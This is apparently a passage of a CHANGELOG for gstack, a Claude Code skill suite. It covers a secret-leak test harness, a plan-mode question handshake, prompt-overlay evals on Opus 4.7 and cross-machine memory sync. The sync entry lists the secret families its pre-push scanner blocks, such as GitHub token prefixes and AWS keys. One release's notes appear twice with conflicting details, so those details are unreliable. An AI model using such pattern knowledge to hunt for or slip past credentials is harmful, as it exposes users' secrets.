`test/helpers/secret-sink-harness.ts` is new infrastructure. Runs a subprocess with a seeded secret, captures stdout / stderr / files-under-HOME / telemetry-JSONL, and asserts the seed never appears in any channel via four match rules (exact + URL-decoded + first-12-char prefix + base64). Seven positive-control tests prove the harness catches leaks in every covered channel; four negative controls run real setup-gbrain bins with seeded secrets and confirm nothing escapes. Any future skill that handles secrets can import `runWithSecretSink` and run the same pattern.

### The numbers that matter

Source: `bun test` against Slices 1–7's five new test files.

| Suite | Tests | Time |
|---|---|---|
| `gbrain-repo-policy.test.ts` | 24 | ~1.2s |
| `gbrain-detect-install.test.ts` | 15 | ~1.0s |
| `gbrain-lib-verify.test.ts` | 22 | ~0.2s |
| `gbrain-supabase-provision.test.ts` | 28 | ~13.8s |
| `secret-sink-harness.test.ts` | 11 | ~7.0s |
| **Total** | **100** | **~23s** |

Every HTTP error path for the Supabase Management API is covered by a mock-server fixture. Every secret-bearing bin is exercised with a distinctive seed through the leak harness.

### What this means for Claude Code users

Previously: install gbrain manually, hope nothing was shadowing on PATH, paste the pooler URL into an echoing prompt, figure out MCP registration yourself. Now: one command, three paths, PAT-handled-correctly auto-provision, MCP registered for Claude Code automatically, trust tiers for multi-client work, leak-tested end-to-end. Run `/setup-gbrain`.

### Itemized changes

#### Added
- `/setup-gbrain` skill (`setup-gbrain/SKILL.md.tmpl`) — full onboarding flow with path selection, PAT-scoped disclosure, redacted URL preview, concurrent-run lock, SIGINT recovery with `--resume-provision`, and `--cleanup-orphans` subcommand.
- `bin/gstack-gbrain-repo-policy` — per-remote trust triad (read-write / read-only / deny), schema-versioned file format, atomic writes, corrupt-file quarantine.
- `bin/gstack-gbrain-detect` — JSON state reporter for skill branching.
- `bin/gstack-gbrain-install` — D5 detect-first installer, D19 PATH-shadow fail-hard validator, pinned gbrain commit.
- `bin/gstack-gbrain-lib.sh` — shared `read_secret_to_env` bash helper.
- `bin/gstack-gbrain-supabase-verify` — structural URL validator with distinct exit for direct-connection rejects.
- `bin/gstack-gbrain-supabase-provision` — Management API wrapper (list-orgs / create / wait / pooler-url / list-orphans / delete-project) with full HTTP error coverage and retry+backoff.
- `test/helpers/secret-sink-harness.ts` — reusable negative-space leak-testing harness.

#### Changed
- `/health` skill adds a GBrain composite dimension (weight 10%, wrapped in `timeout 5s`). Existing category weights rebalanced to keep the composite score on the 0–10 scale; historical JSONL entries without a `gbrain` field read as `null` for trend comparison.

#### For contributors
- Pre-Impl Gate 1 verified Supabase Management API shape before any code was written. Corrected two wrong endpoint assumptions (`POST /v1/projects` not `/v1/organizations/{ref}/projects`; `/config/database/pooler` not `/config/database`) and confirmed gbrain's `--non-interactive` + `GBRAIN_DATABASE_URL` env var are real. Documented in the plan file.
- Review discipline: CEO review + Codex outside voice + Eng review all passed in plan mode before any code landed (3 reviews, 21 D-decisions, 0 unresolved gaps).

## [1.11.1.0] - 2026-04-23

## **Plan mode stopped silently rubber-stamping your reviews. The forcing questions actually fire now.**

If you ran `/plan-ceo-review` or any interactive review skill while in plan mode, the skill used to read your diff, skip every STOP gate, write a plan file, and exit. Zero AskUserQuestion calls. Zero mode selection. Zero per-section decisions. The skill's interactive contract got outranked by plan mode's system-reminder, which tells the model to run its own workflow and ignore everything else. This release adds a preamble-level STOP gate that fires before any analysis, so you always get the interactive review the skill was designed to run.

### What shipped

Four interactive review skills (plan-ceo-review, plan-eng-review, plan-design-review, plan-devex-review) now emit a two-option AskUserQuestion the moment plan mode is detected: exit-and-rerun interactively, or cancel. No silent bypass. The gate is classified one-way-door in the question registry so `/plan-tune` preferences can't auto-decide past it. Outcome gets logged to `~/.gstack/analytics/skill-usage.jsonl` synchronously when the handshake fires, so A-exit and C-cancel are captured even though they terminate the skill before the end-of-run telemetry block.

The test harness got a canUseTool extension built on Anthropic's Agent SDK (already installed at v0.2.117). When a test supplies a canUseTool callback, `test/helpers/agent-sdk-runner.ts` flips `permissionMode` from `bypassPermissions` to `default` so the callback actually fires. This is the foundation for asserting AskUserQuestion content end-to-end, which gstack's E2E tests previously couldn't do at all. They had to instruct the model to skip AskUserQuestion entirely. Every future interactive-skill test builds on this.

### The numbers that matter

Source: new unit tests in `test/gen-skill-docs.test.ts` (8 tests covering handshake presence, absence, composition ordering, 0C-bis STOP block) and `test/agent-sdk-runner.test.ts` (6 tests covering canUseTool + permission-mode + passThrough helper). All 14 pass locally in <250ms, free tier.

| Surface | Before | After |
|---|---|---|
| Claude skills rendering the handshake | 0 | 4 (plan-ceo, plan-eng, plan-design, plan-devex) |
| Non-Claude host outputs with handshake text | N/A | 0 (host-scoped via `ctx.host === 'claude'` check) |
| E2E tests that can assert AskUserQuestion content | 0 | 1 harness primitive, ready for every interactive skill |
| Plan-mode entry to any of 4 review skills | Silent bypass | Two-option STOP gate |
| Step 0C-bis in plan-ceo-review | No STOP block, could drift to 0F | Explicit `**STOP.**` block matching 0F pattern |
| Post-handshake telemetry outcomes captured | Neither A-exit nor C-cancel | Both (synchronous write before ExitPlanMode) |

### What this means for builders

If you're running gstack in plan mode on a PR review, you'll see one question before the skill does anything: "Exit plan mode and run interactively, or cancel?" Pick A, press esc-esc, rerun the skill in normal mode, get the full interactive review you expected. Pick C to bail cleanly. No more silent rubber-stamp.

If you're building new interactive skills (yours or contributing to gstack), you can now write real E2E tests that assert on AskUserQuestion shape and routing via the canUseTool harness. See `test/agent-sdk-runner.test.ts` for the pattern and `test/helpers/agent-sdk-runner.ts` for the API.

### Itemized changes

#### Fixed

- Plan mode no longer silently skips AskUserQuestion gates in `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, or `/plan-devex-review`. A preamble-level handshake fires as the first thing the skill does when the plan-mode system-reminder is present, forcing a user choice before any analysis or plan-file writes.
- `/plan-ceo-review` Step 0C-bis now has an explicit STOP block matching the pattern used at Step 0F, so the approach-selection question can't be silently skipped when the skill continues to mode selection.

#### Added

- New resolver `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` emits the handshake prose and telemetry bash. Host-scoped to Claude only via `ctx.host === 'claude'` check. Opt-in per skill via `interactive: true` in frontmatter.
- New frontmatter field `interactive: boolean` on skill templates. Generator-only input parsed by `scripts/gen-skill-docs.ts`, never written to generated SKILL.md output (follows the `preamble-tier` precedent).
- New question registry entries `plan-{ceo,eng,design,devex}-review-plan-mode-handshake` with `door_type: 'one-way'` in `scripts/question-registry.ts`. Question-tuning `never-ask` preferences cannot suppress this gate.
- New telemetry field `plan_mode_handshake` in `~/.gstack/analytics/skill-usage.jsonl` with outcomes `fired`, `A-exit`, `C-cancel` written synchronously as the handshake fires. Captures outcomes that would otherwise terminate the skill before end-of-run telemetry runs.
- `test/helpers/agent-sdk-runner.ts` extended with optional `canUseTool` callback parameter. When supplied, flips `permissionMode` to `default`, auto-adds `AskUserQuestion` to `allowedTools`, and passes the callback to the SDK. Exports `passThroughNonAskUserQuestion` helper for tests that only want to assert on AskUserQuestion but auto-allow other tools.

#### For contributors

- Added 5 unit tests in `test/gen-skill-docs.test.ts` verifying handshake presence in 4 interactive skills, absence in non-interactive skills, absence in non-Claude host outputs, composition ordering (handshake precedes upgrade-check), and 0C-bis STOP block wiring.
- Added 6 unit tests in `test/agent-sdk-runner.test.ts` verifying permission-mode flip, allowedTools auto-injection, canUseTool callback propagation, and pass-through helper behavior.
- Added 6 gate-tier entries to `test/helpers/touchfiles.ts` covering the new E2E test surface. Dependency glob fires any of the new tests when: the relevant skill template, the handshake resolver, preamble composition, the question registry, the one-way-door classifier, or the agent-sdk-runner changes.
- Filed 2 P1/P2 follow-ups in `TODOS.md`: structural STOP-Ask forcing function across all skills (broader class of bug beyond plan-mode entry), and extending `interactive: true` audit to non-review interactive skills like `/office-hours`, `/codex`, `/investigate`, `/qa`.

## [1.11.0.0] - 2026-04-23

## **Workspace-aware ship. Two open PRs can't both claim the same VERSION anymore.**

If you run gstack in multiple Conductor windows at once, you've probably seen this: two branches bump to the same version, whoever merges second silently overwrites the first one's CHANGELOG entry or lands with a duplicate header, and nobody notices until a `grep "^## \["` later. This release makes that collision impossible by construction. `/ship` now queries the open PR queue, sees what versions are already claimed, and picks the next free slot at your chosen bump level. If a collision is detected between ship and land, the land step aborts and tells you to rerun `/ship` rather than silently overwriting. A new `/landing-report` command shows the whole queue on demand.

### What changes for you

Run `/ship` in one Conductor window while another has an open PR claiming v1.7.0.0. Your ship now sees the claim, renders a queue table, and picks the next free slot above it (same bump level). The PR title starts with `v<X.Y.Z.W>` so landing order is visible in `gh pr list` without opening each PR. If a sibling workspace has uncommitted work at a higher VERSION and looks active (commit in the last 24h), `/ship` asks whether to wait for them or advance past. If the queue shifts between ship and merge, CI's new version-gate catches it, and rerunning `/ship` rewrites VERSION, package.json, CHANGELOG, and the PR title atomically. This very release dogfooded the drift path: the original ship at v1.8.0.0 went stale when three other PRs landed first, and the merge-back-to-main rebump (v1.8.0.0 → v1.11.0.0) happened via the same queue-aware codepath it introduces.

### What shipped (by the numbers)

- `bin/gstack-next-version` — ~390-line Bun/TS util. 21 passing fixture tests covering happy path, 8 collision scenarios, offline fallback, fork-PR filtering, sibling activity detection, self-PR auto-exclusion.
- Host parity: GitHub + GitLab both supported. CI gates: `.github/workflows/version-gate.yml`, `.github/workflows/pr-title-sync.yml`, plus `.gitlab-ci.yml` mirror.
- Fail-open semantics on util errors (network, auth, bug). A gstack bug never freezes your merge queue. Fail-closed on confirmed collisions.
- `/landing-report` skill — read-only dashboard showing queue, siblings, and what all four bump levels would claim.
- `workspace_root` config key, default `$HOME/conductor/workspaces`, null disables sibling scan for non-Conductor users.

### What this means for teams running parallel workspaces

If you're routinely running 3-10 Conductor windows against the same repo, this is the capability that lets the model scale. Before: you mostly got away with it because you noticed collisions by eye. After: the queue is an observable surface, and the system refuses to ship a stale version. `/landing-report` is the new "where am I in line" check when you're about to open PR #6 for the day. Run it before `/ship` if you want to see what's coming without shipping.

### Itemized changes

#### Added

- `bin/gstack-next-version`. Host-aware (GitHub + GitLab + unknown) VERSION allocator. Queries open PRs, fetches each PR's VERSION at head (bounded concurrency, 10 parallel), scans sibling Conductor worktrees, picks the next free slot. Pure reader, never writes files. Supports `--exclude-pr <N>` to filter out the PR being checked (prevents self-reference when CI runs against the PR's own VERSION).
- `scripts/detect-bump.ts`, `scripts/compare-pr-version.ts`. CI gate helpers. Three exit paths: pass, block on confirmed collision, fail-open on util errors.
- `.github/workflows/version-gate.yml`. Merge-time collision gate. Runs when VERSION/CHANGELOG/package.json changes on a PR.
- `.github/workflows/pr-title-sync.yml`. Auto-rewrites PR title when VERSION changes on push, only for titles already carrying the `v<X.Y.Z.W>` prefix (custom titles left alone, idempotent).
- `.gitlab-ci.yml`. GitLab CI parity. Both jobs mirrored with the same fail-open semantics.
- `landing-report/SKILL.md.tmpl`. New `/landing-report` or `/gstack-landing-report` skill. Read-only dashboard.
- `bin/gstack-config`. New `workspace_root` key. Default `$HOME/conductor/workspaces`, `null` disables sibling scan.

#### Changed

- `ship/SKILL.md.tmpl` Step 12. Queue-aware VERSION pick in FRESH path, drift detection in ALREADY_BUMPED path. On detected drift the user is prompted to rebump, which runs the full metadata path (VERSION + package.json + CHANGELOG header + PR title) atomically so nothing goes stale.
- `ship/SKILL.md.tmpl` Step 19. PR title format is now `v<X.Y.Z.W> <type>: <summary>`, version ALWAYS first. Rerun path updates the title (not just the body) when VERSION changed. Both GitHub and GitLab paths.
- `land-and-deploy/SKILL.md.tmpl`. New Step 3.4 pre-merge drift detection. Aborts with a clear rerun-/ship instruction rather than auto-mutating files. Rerunning `/ship` is the clean path because ship owns the full metadata flow.
- `review/SKILL.md.tmpl`. New Step 3.4 advisory one-liner showing queue status. Non-blocking.
- `CLAUDE.md`. Versioning invariant paragraph. Documents that VERSION is a monotonic sequence, not a strict semver commitment, and queue-advance within a bump level is permitted.

#### Fixed

- Self-reference bug in the version gate. The first live CI run (PR #1168 at v1.8.0.0) was rejected as "stale" because the util counted the PR being checked as a queued claim, inflating the next slot by one. Fixed with `--exclude-pr` flag + `gh pr view` auto-detect so the util silently filters the current branch's PR. Caught and fixed in the same ship — exactly the dogfood loop the release is designed for.

#### For contributors

- `test/gstack-next-version.test.ts`. 21 pure-function tests (parseVersion / bumpVersion / cmpVersion / pickNextSlot with 8 collision scenarios / markActiveSiblings 4 cases) plus a CLI smoke test against the live repo.
- Golden ship fixtures refreshed for all three hosts (claude, codex, factory) after Step 12 and Step 19 template changes. This is exactly the blast radius Codex flagged during the CEO review (cross-model tension #8), handled in the same PR rather than as a follow-up.

## **Plan mode stopped silently rubber-stamping your reviews. The forcing questions actually fire now.**

If you ran `/plan-ceo-review` or any interactive review skill while in plan mode, the skill used to read your diff, skip every STOP gate, write a plan file, and exit. Zero AskUserQuestion calls. Zero mode selection. Zero per-section decisions. The skill's interactive contract got outranked by plan mode's system-reminder, which tells the model to run its own workflow and ignore everything else. This release adds a preamble-level STOP gate that fires before any analysis, so you always get the interactive review the skill was designed to run.

### What shipped

Four interactive review skills (plan-ceo-review, plan-eng-review, plan-design-review, plan-devex-review) now emit a two-option AskUserQuestion the moment plan mode is detected: exit-and-rerun interactively, or cancel. No silent bypass. The gate is classified one-way-door in the question registry so `/plan-tune` preferences can't auto-decide past it. Outcome gets logged to `~/.gstack/analytics/skill-usage.jsonl` synchronously when the handshake fires, so A-exit and C-cancel are captured even though they terminate the skill before the end-of-run telemetry block.

The test harness got a canUseTool extension built on Anthropic's Agent SDK (already installed at v0.2.117). When a test supplies a canUseTool callback, `test/helpers/agent-sdk-runner.ts` flips `permissionMode` from `bypassPermissions` to `default` so the callback actually fires. This is the foundation for asserting AskUserQuestion content end-to-end, which gstack's E2E tests previously couldn't do at all. They had to instruct the model to skip AskUserQuestion entirely. Every future interactive-skill test builds on this.

### The numbers that matter

Source: new unit tests in `test/gen-skill-docs.test.ts` (8 tests covering handshake presence, absence, composition ordering, 0C-bis STOP block) and `test/agent-sdk-runner.test.ts` (6 tests covering canUseTool + permission-mode + passThrough helper). All 14 pass locally in <250ms, free tier.

| Surface | Before | After |
|---|---|---|
| Claude skills rendering the handshake | 0 | 4 (plan-ceo, plan-eng, plan-design, plan-devex) |
| Non-Claude host outputs with handshake text | N/A | 0 (host-scoped via `ctx.host === 'claude'` check) |
| E2E tests that can assert AskUserQuestion content | 0 | 1 harness primitive, ready for every interactive skill |
| Plan-mode entry to any of 4 review skills | Silent bypass | Two-option STOP gate |
| Step 0C-bis in plan-ceo-review | No STOP block, could drift to 0F | Explicit `**STOP.**` block matching 0F pattern |
| Post-handshake telemetry outcomes captured | Neither A-exit nor C-cancel | Both (synchronous write before ExitPlanMode) |

### What this means for builders

If you're running gstack in plan mode on a PR review, you'll see one question before the skill does anything: "Exit plan mode and run interactively, or cancel?" Pick A, press esc-esc, rerun the skill in normal mode, get the full interactive review you expected. Pick C to bail cleanly. No more silent rubber-stamp.

If you're building new interactive skills (yours or contributing to gstack), you can now write real E2E tests that assert on AskUserQuestion shape and routing via the canUseTool harness. See `test/agent-sdk-runner.test.ts` for the pattern and `test/helpers/agent-sdk-runner.ts` for the API.

### Itemized changes

#### Fixed

- Plan mode no longer silently skips AskUserQuestion gates in `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, or `/plan-devex-review`. A preamble-level handshake fires as the first thing the skill does when the plan-mode system-reminder is present, forcing a user choice before any analysis or plan-file writes.
- `/plan-ceo-review` Step 0C-bis now has an explicit STOP block matching the pattern used at Step 0F, so the approach-selection question can't be silently skipped when the skill continues to mode selection.

#### Added

- New resolver `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` emits the handshake prose and telemetry bash. Host-scoped to Claude only via `ctx.host === 'claude'` check. Opt-in per skill via `interactive: true` in frontmatter.
- New frontmatter field `interactive: boolean` on skill templates. Generator-only input parsed by `scripts/gen-skill-docs.ts`, never written to generated SKILL.md output (follows the `preamble-tier` precedent).
- New question registry entry `plan-mode-handshake` with `door_type: 'one-way'` in `scripts/question-registry.ts`. Question-tuning `never-ask` preferences cannot suppress this gate.
- New telemetry field `plan_mode_handshake` in `~/.gstack/analytics/skill-usage.jsonl` with outcomes `fired`, `A-exit`, `C-cancel` written synchronously as the handshake fires. Captures outcomes that would otherwise terminate the skill before end-of-run telemetry runs.
- `test/helpers/agent-sdk-runner.ts` extended with optional `canUseTool` callback parameter. When supplied, flips `permissionMode` to `default`, auto-adds `AskUserQuestion` to `allowedTools`, and passes the callback to the SDK. Exports `passThroughNonAskUserQuestion` helper for tests that only want to assert on AskUserQuestion but auto-allow other tools.

#### For contributors

- Added 8 unit tests in `test/gen-skill-docs.test.ts` verifying handshake presence in 4 interactive skills, absence in non-interactive skills, absence in non-Claude host outputs, composition ordering (handshake precedes upgrade-check), and 0C-bis STOP block wiring.
- Added 6 unit tests in `test/agent-sdk-runner.test.ts` verifying permission-mode flip, allowedTools auto-injection, canUseTool callback propagation, and pass-through helper behavior.
- Added 6 gate-tier entries to `test/helpers/touchfiles.ts` covering the new E2E test surface. Dependency glob fires any of the new tests when: the relevant skill template, the handshake resolver, preamble composition, the question registry, the one-way-door classifier, or the agent-sdk-runner changes.
- Filed 2 P1/P2 follow-ups in `TODOS.md`: structural STOP-Ask forcing function across all skills (broader class of bug beyond plan-mode entry), and extending `interactive: true` audit to non-review interactive skills like `/office-hours`, `/codex`, `/investigate`, `/qa`.

## [1.10.1.0] - 2026-04-23

## **We tried to make Opus 4.7 faster with a prompt. Measurement said it got slower. Pulled the bullet.**

gstack shipped a "Fan out explicitly" overlay nudge in `model-overlays/opus-4-7.md`
back in v1.5.2.0. The idea: tell Opus 4.7 to emit multiple tool calls in one
assistant turn instead of one per turn, so "read three files" takes one API
round-trip instead of three. Sounded obvious. This release removes that
bullet after measuring that it actively hurt performance, and ships the eval
harness we used to prove it so you can measure your own overlay changes.

### The numbers that matter

Source: new `test/skill-e2e-overlay-harness.test.ts`, N=10 trials per arm per
fixture, 40 trials per run, ~$3 per run. Pinned to `claude-opus-4-7` via
Anthropic's published Agent SDK (`@anthropic-ai/claude-agent-sdk@0.2.117`)
with `pathToClaudeCodeExecutable` set to the locally-installed `claude` binary
(2.1.118). Metric: number of parallel `tool_use` blocks in the first assistant
turn.

| Prompt text in overlay | First-turn fanout rate (toy: read 3 files) | Lift vs baseline |
|---|---|---|
| No overlay (default Claude Code system prompt only) | **70%** (7/10) | baseline |
| gstack's original "Fan out explicitly" nudge (v1.5.2.0 through v1.6.3.0) | 10% (1/10) | **-60%** |
| Anthropic's own canonical `<use_parallel_tool_calls>` text from their parallel-tool-use docs | **0%** (0/10) | **-70%** |

On a realistic multi-file audit prompt (`read app.ts + config.ts + README.md,
glob src/*.ts, summarize`), Opus 4.7 never fanned out in the first turn at all,
regardless of overlay. Zero of 20 trials. The nudge had nothing to grip.

Total cost of the investigation: **$7** across three eval runs.

### What this means for you

If you ship system-prompt nudges for Claude, measure them. Anthropic's own
published best-practice text dropped our fanout rate to zero. That's not a
claim about Anthropic, it's a claim about measurement: the model, the SDK,
the binary, and the context all move under the advice, and the advice sits
still. The harness is in the repo now. Run
`EVALS=1 EVALS_TIER=periodic bun test test/skill-e2e-overlay-harness.test.ts`.
Three dollars per run.

### Itemized changes

#### Fixed

- `model-overlays/opus-4-7.md` — removed the "Fan out explicitly" block. The
  other three nudges (effort-match, batch questions, literal interpretation)
  are untested and stay in for now. They're candidates for their own
  measurement in a follow-up PR.

#### Added

- `test/skill-e2e-overlay-harness.test.ts` — periodic-tier eval that iterates a
  typed fixture registry and runs A/B arms through `@anthropic-ai/claude-agent-sdk`.
  Uses SDK preset `claude_code` so the arms include Claude Code's real system
  prompt; overlay-ON appends the resolved overlay text. Saves per-trial raw
  event streams for forensic recovery. Gated on both `EVALS=1` and
  `EVALS_TIER=periodic`.
- `test/fixtures/overlay-nudges.ts` — typed `OverlayFixture` registry with
  strict validator. Adding a future nudge to measure = one fixture entry.
  First two fixtures: `opus-4-7-fanout-toy` and `opus-4-7-fanout-realistic`.
- `test/helpers/agent-sdk-runner.ts` — parametric SDK wrapper with explicit
  `AgentSdkResult` types, process-level API concurrency semaphore, and
  three-shape 429 retry (thrown error, result-message error, mid-stream
  `SDKRateLimitEvent`). Binary pinning via `pathToClaudeCodeExecutable`.
- `test/agent-sdk-runner.test.ts` — 36 free-tier unit tests covering happy
  path, all three rate-limit shapes, persistent-429 `RateLimitExhaustedError`,
  non-429 propagation, options propagation, concurrency cap, and every
  validator rejection case.
- `scripts/preflight-agent-sdk.ts` — 20-line sanity check that confirms the
  SDK loads, `claude-opus-4-7` is a live API model, the `SDKMessage` event
  shape matches assumptions, and the overlay resolver produces the expected
  text. Run manually before paid runs if you suspect drift. Costs ~$0.013.
- `@anthropic-ai/claude-agent-sdk@0.2.117` in `devDependencies`. Exact pin,
  no caret — SDK event shapes can drift on minor versions.

#### Changed

- `scripts/resolvers/model-overlay.ts` — exported `readOverlay` so the eval
  harness can resolve `{{INHERIT:claude}}` directives without synthesizing a
  full `TemplateContext`.

#### For contributors

- `test/helpers/touchfiles.ts` — registered the new eval in both
  `E2E_TOUCHFILES` (deps: `model-overlays/**`, `overlay-nudges.ts`, runner,
  resolver) and `E2E_TIERS` (`periodic`). Passes the
  `test/touchfiles.test.ts` completeness check.
- The harness is deliberately parametric. Adding a second overlay nudge
  measurement (for the remaining three nudges in `opus-4-7.md`, or any
  future nudge in any overlay file) is a single entry in
  `test/fixtures/overlay-nudges.ts`. Total incremental effort: ~15 minutes
  per fixture.

## [1.10.0.0] - 2026-04-23

## **Plan reviews walk you through each issue again, and every question is now a real decision brief.**

v1.6.4.0 broke something nobody wrote down. Plan reviews on Opus 4.7 silently stopped asking questions one at a time. They turned into a report: here are 6 findings, end of turn. The interactive dialogue that made `/plan-ceo-review`, `/plan-eng-review`, and the rest useful quietly evaporated. v1.10.0.0 restores that, and bundles a format upgrade so every `AskUserQuestion` now renders as a numbered decision brief with ELI10, stakes, recommendation, per-option pros / cons (✅ / ❌), and a closing "Net:" line that frames the trade-off in one sentence.

### What changes for you

Run `/plan-ceo-review` or `/plan-eng-review` on a plan with 3 findings. You get 3 separate AskUserQuestion prompts, one per finding, with the full Pros / Cons shape. Pick the option in 5 seconds, or expand the pros / cons if you want to think about it. Every review finding becomes a decision you actually made, not a bullet point you skimmed. The reference shape matches the D2 memory-design question Garry hand-crafted for his own use, now baked into every tier-2 skill via the preamble resolver, so `/ship`, `/office-hours`, `/investigate`, and the rest inherit it for free.

### The numbers that matter

Measured across the v1.10.0.0 fix. Verify any claim with `git log 1.9.0.0..1.10.0.0 --oneline` and `bun test` against the pinned commit SHA.

| Metric | v1.6.4.0 | v1.10.0.0 | Δ |
|---|---|---|---|
| `AskUserQuestion` renders above model overlay in SKILL.md | no | **yes** | ordering inverted |
| Escape-hatch sites hardened across plan-review templates | 0 | **16** | +16 |
| Gate-tier unit tests pinning the format contract | 0 | **30** | +30 (runs in 16ms, $0) |
| Periodic evals defending against escape-hatch abuse | 0 | **4** | +4 (2 positive, 2 negative-case) |
| Cross-model review findings incorporated before landing | N/A | **5 of 8** | Codex caught real bugs CEO+Eng missed |

Two of the five Codex findings were load-bearing. (1) The overlay reorder theory wasn't enough on its own. The `(recommended)` label on a neutral-posture question had to stay, because `question-tuning.ts:29` reads it to power AUTO_DECIDE. Omitting it would have silently broken auto-decide on every cherry-pick prompt. (2) The "31 sites global replace" in the original plan was factually wrong. Actual count, verified with `rg`, is 16 sites across 4 templates, and eng/design/devex templates used different phrasing than CEO. Without the audit, the fix would have shipped half-applied.

### What this means for anyone running plan reviews on Opus 4.7

Upgrade and re-run your next plan review. You should see D-numbered prompts (D1, D2, D3...) with ELI10 paragraphs, stakes lines, and ✅ / ❌ bullet blocks per option. If you don't, check that `bun run gen:skill-docs` regenerated cleanly after the upgrade, and verify the `Pros / cons:` header renders in `plan-ceo-review/SKILL.md`. Complete plan reviews that used to take 20 minutes and produced a report now take 10 minutes and produce a row of decisions.

### Itemized changes

#### Added

- New Pros / Cons decision-brief format for every `AskUserQuestion` across all tier-2+ skills. Rendering: `D<N>` header, ELI10, "Stakes if we pick wrong:", Recommendation, per-option `✅ / ❌` bullets with minimum 2 pros + 1 con, closing `Net:` synthesis line. Lands in `scripts/resolvers/preamble/generate-ask-user-format.ts` so every skill inherits it.
- Hard-stop escape for destructive one-way choices: single bullet `✅ No cons — this is a hard-stop choice`.
- Neutral-posture handling for SELECTIVE EXPANSION cherry-picks and taste calls: `Recommendation: <default> — this is a taste call, no strong preference either way` with `(recommended)` label preserved on the default to keep AUTO_DECIDE working.
- Three gate-tier unit tests (`test/preamble-compose.test.ts`, `test/resolver-ask-user-format.test.ts`, `test/model-overlay-opus-4-7.test.ts`) that pin the composition order, format contract, and overlay text. Run in <100ms on every `bun test`.
- Four periodic-tier Pros/Cons eval cases in `test/skill-e2e-plan-prosons.test.ts` including two negative-case assertions that catch escape-hatch abuse before it drifts.
- Touchfiles entries (`test/helpers/touchfiles.ts`) for all new eval cases plus expanded-coverage stubs for 7 additional skills.

#### Fixed

- Plan-review cadence regression on Opus 4.7. `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, and `/plan-devex-review` now actually pause after each finding and call `AskUserQuestion` as a tool_use instead of batching everything into one summary report. Root cause: `generateModelOverlay` rendered above `generateAskUserFormat` in `scripts/resolvers/preamble.ts`, so the overlay's "Batch your questions" directive registered as the ambient default before the pacing rule. Fixed by reordering the section array and rewriting the overlay directive as "Pace questions to the skill".
- Escape-hatch collapse: "If no issues or fix is obvious, state what you'll do and move on, don't waste a question" at 16 sites across 4 templates let Opus 4.7's literal interpreter classify every finding as self-dismissable. Tightened per-template: zero findings gets "No issues, moving on"; findings require AskUserQuestion as a tool_use.

#### Changed

- `test/skill-e2e-plan-format.test.ts`: extended with v1.10.0.0 format token regexes (D-number, ELI10, Stakes, Pros/cons, Net). Existing RECOMMENDATION check loosened to accept mixed-case "Recommendation:".
- `test/skill-validation.test.ts`: format assertions updated from "RECOMMENDATION: Choose" to the new Pros/Cons token set.
- Golden fixtures regenerated: `test/fixtures/golden/claude-ship-SKILL.md`, `codex-ship-SKILL.md`, `factory-ship-SKILL.md`.

#### For contributors

- Outside-voice Codex review (`codex exec` with `model_reasoning_effort="high"`) caught two factual bugs in the original plan: the "31 sites" count (actually 16) and the AUTO_DECIDE contract break on neutral-posture questions. 5 of 8 Codex findings incorporated, 1 rejected (kept defense in depth on the composition reorder), 1 declined (HOLD SCOPE mode lock).
- Follow-up: true multi-turn cadence eval (3 findings produce 3 distinct AskUserQuestion invocations across turns) requires new harness support for multi-capture. Filed in NOT-in-scope. Current single-capture eval covers format + escape-hatch abuse but not cadence itself.
- Follow-up: expanded-coverage eval cases for `/ship`, `/office-hours`, `/investigate`, `/qa`, `/review`, `/design-review`, `/document-release`. Touchfiles entries exist; test blocks will land per-skill in follow-up PRs.
- D-numbering is a model-level instruction, not a runtime counter. `TemplateContext` has no state for it. Drift over long sessions is expected; a registry (deferred to TODOs) is the long-term fix.

## [1.9.0.0] - 2026-04-23

## **Your gstack memory now travels with you. Cross-machine brain via a private git repo + optional GBrain indexing, no daemon, no credential leaks.**

gstack session memory (learnings, plans, designs, retros, developer profile) used to die at the machine boundary. Now it doesn't. `gstack-brain-init` turns `~/.gstack/` into a git repo with an explicit allowlist, writer shims enqueue changed files at write-time, and a preamble-boundary sync pushes them to a private git remote of your choice. GBrain is the first consumer but the architecture is pluggable — Codex, OpenClaw, or anything else can be a reader later. No daemon, no background process, no new auth surface.

The feature shipped after four plan reviews: /office-hours shaping, /plan-eng-review (6 issues → CLEAR), /plan-ceo-review (SELECTIVE EXPANSION, 2 cherry-picks accepted), /codex twice (16+16 findings applied, daemon model dropped in round 2), and /plan-devex-review (6/10 → 8/10, docs elevated to full treatment). The scope simplification from Codex round 2 alone removed ~1 week of daemon lifecycle surface.

### What you can now do

- **Initialize cross-machine sync:** `gstack-brain-init` creates a private git repo (GitHub via `gh`, or any git URL — GitLab, Gitea, self-hosted). 30-90 second TTHW.
- **See yesterday's laptop on today's desktop:** copy `~/.gstack-brain-remote.txt` to the new machine, run `gstack-brain-restore`, and your learnings follow you.
- **Control what syncs:** one-time privacy stop-gate on first run — `full` (everything allowlisted), `artifacts-only` (plans/designs/retros/learnings, skip behavioral), `off` (decline).
- **Sleep through the conflict case:** two machines writing the same JSONL file the same day merge cleanly via a ts-sort-plus-hash-fallback merge driver registered automatically.
- **Uninstall cleanly:** `gstack-brain-uninstall` removes the sync layer, leaves your data intact.
- **Never push a secret:** AWS keys, GitHub tokens (`ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`/`github_pat_`), OpenAI `sk-` keys, PEM blocks, JWTs, and bearer-token-in-JSON patterns are all blocked before push. `--skip-file <path>` gives you a single-command escape hatch for false positives.

### The numbers that matter

Source: integration smoke tests run during implementation, plus 27-test consolidated suite (`test/brain-sync.test.ts`). End-to-end round trip (init on machine A → write learning → restore on machine B → see the learning) verified inline.

| Surface | Shape |
|---|---|
| New binaries | 8 (`gstack-brain-init`, `-enqueue`, `-sync`, `-consumer`, `-reader` alias, `-restore`, `-uninstall`, `gstack-jsonl-merge`) |
| Config keys | 2 enum-validated (`gbrain_sync_mode`: off/artifacts-only/full; `gbrain_sync_mode_prompted`: bool) |
| Writer shims modified | 4 (learnings-log, timeline-log, review-log, developer-profile on --migrate path) |
| Writers deliberately NOT synced | 2 (question-log, question-preference — per-machine UX state, Codex v2 decision) |
| Sync granularity | per-skill-boundary via `gstack-brain-sync --once` from preamble (no daemon) |
| Privacy tiers | 3 (full / artifacts-only / off) |
| Secret patterns blocked | 6 families (AWS, GH tokens, OpenAI, PEM, JWT, bearer-in-JSON) |
| User-facing naming | `reader` (CLI); internal data model stays `consumer` per Codex-v2 DX decision |
